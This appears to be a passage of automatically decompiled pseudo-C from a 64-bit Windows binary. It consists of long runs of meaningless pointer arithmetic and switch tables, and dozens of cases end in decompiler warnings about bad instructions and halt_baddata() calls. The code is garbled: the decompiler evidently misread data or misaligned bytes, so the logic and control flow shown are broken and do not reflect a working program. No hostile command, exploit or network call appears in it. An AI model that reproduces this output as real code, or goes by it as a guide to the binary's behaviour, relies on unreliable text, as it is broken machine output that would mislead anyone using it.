*piVar21 = *piVar21 + cVar10;\n        *pcVar22 = *pcVar22 + cVar10;\n        *piVar21 = *piVar21 + cVar10;\n        pcVar16 = unaff_RSI * 9 + 0xf;\n        *pcVar16 = *pcVar16 + uVar33;\n        *piVar21 = *piVar21 + piVar21;\n        cVar11 = *piVar21;\n        *piVar21 = *piVar21 + cVar10;\n        cVar12 = (uVar4 & 0xffffffffffffff00) >> 8;\n        pcVar16 = piVar21 & 0xffffffffffff0000 | piVar21 / cVar12 & 0xffU | piVar21 % cVar12 << 8;\n        if (SCARRY1(cVar11, cVar10)) {\n            pcVar16 = *puVar27;\n        }\n        cVar11 = pcVar16;\n        *pcVar16 = *pcVar16 + cVar11;\n        *pcVar22 = *pcVar22 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        *pcVar22 = *pcVar22 + cVar11;\n        *pcVar16 = *pcVar16 + cVar11;\n        uVar35 = uVar8 >> 8;\n        uVar26 = uVar33 + uVar35;\n        puVar27 = uVar18 | uVar26;\n        if (SCARRY1(uVar33, uVar35)) {\n            pcVar16 = *puVar27;\n        }\n        *pcVar16 = *pcVar16 + pcVar16;\n        cVar11 = pcVar16 >> 8;\n        piVar21 = pcVar16 & 0xffffffffffff0000 | CONCAT11(cVar11 + uVar35, pcVar16);\n        if (SCARRY1(cVar11, uVar35)) {\n            piVar21 = *puVar27;\n        }\n        cVar11 = piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar24 = *pcVar24 + cVar11;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar22 = *pcVar22 + cVar11;\n        *piVar21 = *piVar21 + cVar11;\n        *piVar21 = *piVar21 + cVar11;\n        *unaff_RDI = *unaff_RDI + -1;\n        *piVar21 = *piVar21 + piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        uVar14 = unaff_RSI;\n        uVar45 = unaff_RDI + uVar14;\n        pcVar16 = uVar45;\n        if (SCARRY4(unaff_RDI, uVar14)) {\n            piVar21 = *puVar27;\n        }\n        cVar11 = piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar22 = *pcVar22 + cVar11;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar22 = *pcVar22 + cVar11;\n        *piVar21 = *piVar21 + cVar11;\n        *unaff_RSI = *unaff_RSI + cVar11;\n        *pcVar16 = *pcVar16 + -1;\n        *piVar21 = *piVar21 + piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        uVar14 = uVar14 | uVar45;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar24 = *pcVar24 + uVar26;\n        *piVar21 = *piVar21 + cVar11;\n        *puVar27 = *puVar27 + cVar11;\n        *piVar21 = *piVar21 + cVar11;\n        *0x14150127b = *0x14150127b + uVar25;\n        *piVar21 = *piVar21 + cVar11;\n        *piVar21 = *piVar21 + uVar34;\n        *pcVar16 = *pcVar16 + -1;\n        *piVar21 = *piVar21 + piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        uVar13 = cVar11 + *piVar21;\n        pcVar16 = piVar21 & 0xffffffffffffff00 | uVar13;\n        *pcVar16 = *pcVar16 + uVar13;\n        uVar13 = uVar13 + *pcVar16;\n        piVar21 = piVar21 & 0xffffffffffffff00 | uVar13;\n        uVar33 = *piVar21;\n        *piVar21 = *piVar21 + uVar13;\n        uVar46 = (uVar45 - uVar14) - CARRY1(uVar33, uVar13);\n        pcVar16 = uVar46;\n        if (SBORROW4(uVar45, uVar14) != SBORROW4(uVar45 - uVar14, CARRY1(uVar33, uVar13))) {\n            piVar21 = *puVar27;\n        }\n        cVar11 = piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        *uVar14 = *uVar14 + uVar34;\n        *pcVar16 = *pcVar16 + -1;\n        *piVar21 = *piVar21 + piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        *piVar21 = *piVar21 + piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        uVar33 = cVar11 + *piVar21;\n        uVar18 = piVar21 & 0xffffffffffffff00;\n        piVar21 = uVar18 | uVar33;\n        *piVar21 = *piVar21 + uVar33;\n        uVar4 = CONCAT11(uVar31 & uVar35, uVar25);\n        pcVar30 = uVar6 | uVar4;\n        *piVar21 = *piVar21 + uVar33;\n        *pcVar24 = *pcVar24 + (uVar18 >> 8);\n        *pcVar16 = *pcVar16 + -1;\n        *piVar21 = *piVar21 + piVar21;\n        *piVar21 = *piVar21 + uVar33;\n        uVar33 = uVar33 + *piVar21;\n        pcVar22 = uVar18 | uVar33;\n        *pcVar22 = *pcVar22 + uVar33;\n        uVar33 = uVar33 + *pcVar22;\n        piVar21 = uVar18 | uVar33;\n        *piVar21 = *piVar21 + uVar33;\n        *pcVar16 = *pcVar16 + -1;\n        *piVar21 = *piVar21 + piVar21;\n        *piVar21 = *piVar21 + uVar33;\n        if (SBORROW4(uVar14, uVar46)) {\n            piVar21 = *puVar27;\n        }\n        cVar11 = piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar30 = *pcVar30 + cVar11;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar30 = *pcVar30 + cVar11;\n        *piVar21 = *piVar21 + cVar11;\n        pcVar22 = (uVar14 - uVar46) + pcVar16 * 8;\n        cVar11 = *pcVar22;\n        *pcVar22 = *pcVar22 + cVar12;\n        if (SCARRY1(cVar11, cVar12)) {\n            piVar21 = *puVar27;\n        }\n        cVar11 = piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar16 = *pcVar16 + cVar12;\n        *pcVar16 = *pcVar16 + -1;\n        *piVar21 = *piVar21 + piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        *piVar21 = *piVar21 + piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        uVar33 = cVar11 + *piVar21;\n        piVar23 = piVar21 & 0xffffffffffffff00 | uVar33;\n        *piVar23 = *piVar23 + uVar33;\n        uVar18 = uVar14 - uVar46 ^ uVar46;\n        *piVar23 = *piVar23 + uVar33;\n        *(unaff_RBP + 0x1400ffd) = *(unaff_RBP + 0x1400ffd) + ((piVar21 & 0xffffffffffffff00) >> 8);\n        *piVar23 = *piVar23 + uVar33;\n        *puVar27 = *puVar27 + uVar33;\n        *piVar23 = *piVar23 + uVar33;\n        *pcVar30 = *pcVar30 + uVar33;\n        *piVar23 = *piVar23 + uVar33;\n        pcVar22 = uVar18 + pcVar16 * 8;\n        cVar11 = *pcVar22;\n        cVar10 = uVar4 >> 8;\n        *pcVar22 = *pcVar22 + cVar10;\n        if (SCARRY1(cVar11, cVar10)) {\n            piVar23 = *puVar27;\n        }\n        cVar11 = piVar23;\n        *piVar23 = *piVar23 + cVar11;\n        *pcVar16 = *pcVar16 + cVar10;\n        *pcVar16 = *pcVar16 + -1;\n        *piVar23 = *piVar23 + piVar23;\n        *piVar23 = *piVar23 + cVar11;\n        uVar33 = cVar11 + *piVar23;\n        piVar21 = piVar23 & 0xffffffffffffff00 | uVar33;\n        *piVar21 = *piVar21 + uVar33;\n        *piVar21 = *piVar21 + piVar21;\n        *piVar21 = *piVar21 + uVar33;\n        if (SBORROW1(uVar35, cVar10)) {\n            piVar21 = *puVar27;\n        }\n        cVar10 = piVar21;\n        *piVar21 = *piVar21 + cVar10;\n        *0x14150132b = *0x14150132b + uVar35;\n        *piVar21 = *piVar21 + cVar10;\n        *0x143100335 = *0x143100335 + cVar10;\n        *piVar21 = *piVar21 + cVar10;\n        pcVar24 = pcVar24 + -2;\n        cVar11 = *pcVar24;\n        *pcVar24 = *pcVar24 + cVar10;\n        if (SCARRY1(cVar11, cVar10)) {\n            piVar21 = *puVar27;\n        }\n        cVar10 = piVar21;\n        *piVar21 = *piVar21 + cVar10;\n        pcVar24 = uVar18 - 2;\n        cVar11 = *pcVar24;\n        *pcVar24 = *pcVar24 + cVar10;\n        if (SCARRY1(cVar11, cVar10)) {\n            piVar21 = *puVar27;\n        }\n        cVar11 = piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar30 = *pcVar30 + cVar11;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar30 = *pcVar30 + cVar11;\n        *piVar21 = *piVar21 + cVar11;\n        pcVar24 = puVar27 + -2;\n        cVar11 = *pcVar24;\n        *pcVar24 = *pcVar24 + uVar26;\n        if (SCARRY1(cVar11, uVar26)) {\n            piVar21 = *puVar27;\n        }\n        cVar11 = piVar21;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar16 = *pcVar16 + cVar12;\n        *pcVar16 = *pcVar16 + -1;\n        iVar15 = piVar21;\n        *piVar21 = *piVar21 + iVar15;\n        *piVar21 = *piVar21 + cVar11;\n        *piVar21 = *piVar21 + iVar15;\n        *piVar21 = *piVar21 + cVar11;\n        *piVar21 = *piVar21 + iVar15;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar16 = *pcVar16 + -1;\n        *piVar21 = *piVar21 + iVar15;\n        *piVar21 = *piVar21 + cVar11;\n        *unaff_R15 = *unaff_R15 + -1;\n        *piVar21 = *piVar21 + iVar15;\n        *piVar21 = *piVar21 + cVar11;\n        *piVar21 = *piVar21 + iVar15;\n        *piVar21 = *piVar21 + cVar11;\n        *piVar21 = *piVar21 + iVar15;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar16 = *pcVar16 + -1;\n        *piVar21 = *piVar21 + iVar15;\n        *piVar21 = *piVar21 + cVar11;\n        *pcVar16 = *pcVar16 + -1;\n        *piVar21 = *piVar21 + iVar15;\n        *piVar21 = *piVar21 + cVar11;\n        uVar14 = iVar15 + *piVar21;\n        piVar21 = uVar14;\n        *piVar21 = *piVar21 + uVar14;\n        uVar14 = uVar14 + *piVar21;\n        *uVar14 = *uVar14 + uVar14;\n        *pcVar16 = *pcVar16 + -1;\n        uVar26 = uVar26 - 0x30;\n        *pcVar16 = *pcVar16 + -1;\n        pcVar24 = &stack0xffffffffffffff00 | uVar26;\n        *pcVar24 = *pcVar24 + uVar26;\n        uVar26 = uVar26 + *pcVar24;\n        piVar21 = &stack0xffffffffffffff00 | uVar26;\n        *piVar21 = *piVar21 + uVar26;\n        *pcVar16 = *pcVar16 + -1;\n        *piVar21 = *piVar21 + piVar21;\n        *piVar21 = *piVar21 + uVar26;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x48:\n    case 0x59:\n    case 0x7b:\n    case 0x86:\n    case 0x9b:\n    case 0xb8:\n    case 0xc9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x49:\n    case 0x5a:\n    case 0x7c:\n    case 0x87:\n    case 0x9c:\n    case 0xb9:\n    case 0xca:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4a:\n    case 0x5b:\n    case 0x7d:\n    case 0x88:\n    case 0x9d:\n    case 0xba:\n    case 0xcb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4b:\n    case 0xbb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4c:\n    case 0xbc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4d:\n    case 0xbd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x51:\n    case 0xc1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x52:\n    case 0xc2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x53:\n    case 0xc3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x54:\n    case 0xc4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x55:\n    case 0xc5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x56:\n    case 0xc6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x57:\n    case 199:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x58:\n    case 200:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5c:\n    case 0xcc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5d:\n    case 0xcd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5e:\n    case 0x96:\n    case 0xa2:\n    case 0xce:\n    case 0xeb:\n    case 0xfb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5f:\n    case 0x97:\n    case 0xa3:\n    case 0xcf:\n    case 0xec:\n    case 0xfc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x60:\n    case 0x98:\n    case 0xa4:\n    case 0xd0:\n    case 0xed:\n    case 0xfd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x61:\n    case 0xd1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x62:\n    case 0xd2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 99:\n    case 0x69:\n    case 0x6e:\n    case 0x80:\n    case 0xd3:\n    case 0xd9:\n    case 0xde:\n    case 0xf0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 100:\n    case 0x6a:\n    case 0x6f:\n    case 0x81:\n    case 0xd4:\n    case 0xda:\n    case 0xdf:\n    case 0xf1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x65:\n    case 0x6b:\n    case 0x70:\n    case 0x82:\n    case 0xd5:\n    case 0xdb:\n    case 0xe0:\n    case 0xf2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x66:\n    case 0x71:\n    case 0xd6:\n    case 0xe1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x67:\n    case 0xd7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x68:\n    case 0xd8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6c:\n    case 0xdc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6d:\n    case 0xdd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x72:\n    case 0xe2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x73:\n    case 0xe3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x74:\n    case 0xe4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x75:\n    case 0xe5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x76:\n    case 0x91:\n    case 0x9f:\n    case 0xe6:\n    case 0xf6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x77:\n    case 0x92:\n    case 0xa0:\n    case 0xe7:\n    case 0xf7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x78:\n    case 0x93:\n    case 0xe8:\n    case 0xf8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x79:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x7f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x83:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x84:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x85:\n        switch(uVar14) {\n        case 0:\n        case 1:\n        case 2:\n        case 3:\n        case 4:\n        case 5:\n        case 6:\n        case 7:\n        case 8:\n        case 9:\n        case 10:\n        case 0xb:\n        case 0xc:\n        case 0xd:\n        case 0xe:\n        case 0xf:\n        case 0x10:\n        case 0x11:\n        case 0x12:\n        case 0x13:\n        case 0x14:\n        case 0x15:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x16:\n        case 0x17:\n        case 0x18:\n        case 0x19:\n        case 0x1a:\n        case 0x1b:\n        case 0x1c:\n        case 0x1d:\n        case 0x1e:\n        case 0x1f:\n        case 0x20:\n        case 0x21:\n        case 0x22:\n        case 0x23:\n        case 0x24:\n        case 0x25:\n        case 0x27:\n        case 0x28:\n        case 0x2a:\n        case 0x2b:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x26:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x29:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        default:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x37:\n        case 0x38:\n        case 0x39:\n        case 0xa7:\n        case 0xa8:\n        case 0xa9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x47:\n        case 0xb7:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0x85:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    case 0x89:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x8f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x90:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x94:\n    case 0xf9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x95:\n    case 0xfa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x99:\n    case 0xfe:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x9a:\n    case 0xff:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x9e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xa1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xa5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xa6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xea:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xee:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xef:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puVar17 = pcVar16 & 0xffffffffffffff90;\n    *puVar17 = *puVar17 + puVar17;\n    uStack40 = *puVar17;\n    arg1 = 0x1400fd6a8;\n    puVar27 = 0x1400fd700;\n    uVar14 = in_stack_00000048 - 100 & 0xff;\n    uVar18 = *(uVar14 * 4 + 0x1400fd700);\n    uStack32 = puVar17[1];\n    puVar20 = uVar18 + 0x1400fd700;\n    uVar45 = puVar20;\n    arg3 = in_stack_00000030;\n    // switch table (22 cases) at 0x1400fd700\n    switch(uVar14) {\n    case 0:\n        uStack112 = 0x14007dcb2;\n        (**(*in_stack_00000030 + 0x20))\n                  (uStack40, in_XMM1_Qa, uStack24, 0x1400fd6a8, in_stack_00000030, &stack0xffffffffffffffe8, \n                   &stack0xffffffffffffffd8);\n        return 0x1400fd6a8;\n    default:\n        uStack112 = 0x14007dce2;\n        (**(*in_stack_00000030 + 0x38))\n                  (uStack40, in_XMM1_Qa, uStack24, 0x1400fd6a8, in_stack_00000030, &stack0xffffffffffffffe8, \n                   &stack0xffffffffffffffd8);\n        return 0x1400fd6a8;\n    case 9:\n        pcVar16 = *in_stack_00000030;\n        goto code_r0x00014007dc68;\n    case 0x10:\n        pcVar16 = *in_stack_00000030;\n        goto code_r0x00014007dc38;\n    case 0x13:\n        pcVar16 = *in_stack_00000030;\n        goto code_r0x00014007dc08;\n    case 0x16:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x17:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x18:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x19:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x1f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x20:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x21:\n    case 0x22:\n    case 0x23:\n    case 0x91:\n    case 0x92:\n    case 0x93:\n        uStack112 = *(uVar45 + 0x2da7ffc7);\n    // WARNING: Could not recover jumptable at 0x0001400fd757. Too many branches\n    // WARNING: Treating indirect jump as call\n        pcVar16 = (*CONCAT17(*0x1400fd710, CONCAT52(*0x1400fd70b, *0x1400fd709)))(uStack40, in_XMM1_Qa, uStack24);\n        return pcVar16;\n    case 0x24:\n    case 0x94:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x25:\n    case 0x95:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x26:\n    case 0x96:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x27:\n    case 0x38:\n    case 0x97:\n    case 0xa8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x28:\n    case 0x39:\n    case 0x98:\n    case 0xa9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x29:\n    case 0x3a:\n    case 0x99:\n    case 0xaa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2a:\n    case 0x9a:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2b:\n    case 0x9b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2c:\n    case 0x9c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2d:\n    case 0x9d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2e:\n    case 0x9e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2f:\n    case 0x9f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x30:\n    case 0xa0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x31:\n    case 0xa1:\n        goto code_r0x000140100075;\n    case 0x32:\n    case 0x43:\n    case 0x65:\n    case 0x70:\n    case 0x85:\n    case 0xa2:\n    case 0xb3:\n    case 0xea:\n    case 0xf8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x33:\n    case 0x44:\n    case 0x66:\n    case 0x71:\n    case 0x86:\n    case 0xa3:\n    case 0xb4:\n    case 0xeb:\n    case 0xf9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x34:\n    case 0x45:\n    case 0x67:\n    case 0x72:\n    case 0x87:\n    case 0xa4:\n    case 0xb5:\n    case 0xec:\n    case 0xfa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x35:\n    case 0xa5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x36:\n    case 0xa6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x37:\n    case 0xa7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3b:\n    case 0xab:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3c:\n    case 0xac:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3d:\n    case 0xad:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3e:\n    case 0xae:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3f:\n    case 0xaf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x40:\n    case 0xb0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x41:\n    case 0xb1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x42:\n    case 0xb2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x46:\n    case 0xb6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x47:\n    case 0xb7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x48:\n    case 0x80:\n    case 0x8c:\n    case 0xb8:\n    case 0xd5:\n    case 0xe5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x49:\n    case 0x81:\n    case 0x8d:\n    case 0xb9:\n    case 0xd6:\n    case 0xe6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4a:\n    case 0x82:\n    case 0x8e:\n    case 0xba:\n    case 0xd7:\n    case 0xe7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4b:\n    case 0xbb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4c:\n    case 0xbc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4d:\n    case 0x53:\n    case 0x58:\n    case 0x6a:\n    case 0xbd:\n    case 0xc3:\n    case 200:\n    case 0xda:\n    case 0xfb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4e:\n    case 0x54:\n    case 0x59:\n    case 0x6b:\n    case 0xbe:\n    case 0xc4:\n    case 0xc9:\n    case 0xdb:\n    case 0xfc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4f:\n    case 0x55:\n    case 0x5a:\n    case 0x6c:\n    case 0xbf:\n    case 0xc5:\n    case 0xca:\n    case 0xdc:\n    case 0xfd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x50:\n    case 0x5b:\n    case 0xc0:\n    case 0xcb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x51:\n    case 0xc1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x52:\n    case 0xc2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x56:\n    case 0xc6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x57:\n    case 199:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5c:\n    case 0xcc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5d:\n    case 0xcd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5e:\n    case 0xce:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x5f:\n    case 0xcf:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x60:\n    case 0x7b:\n    case 0x89:\n    case 0xd0:\n    case 0xe0:\n    case 0xf5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x61:\n    case 0x7c:\n    case 0x8a:\n    case 0xd1:\n    case 0xe1:\n    case 0xf6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x62:\n    case 0x7d:\n    case 0xd2:\n    case 0xe2:\n    case 0xf7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 99:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 100:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x68:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x69:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x6f:\n        break;\n    case 0x73:\n    case 0xed:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x74:\n    case 0xee:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x75:\n    case 0xef:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x76:\n    case 0xf0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x77:\n    case 0xf1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x78:\n    case 0xf2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    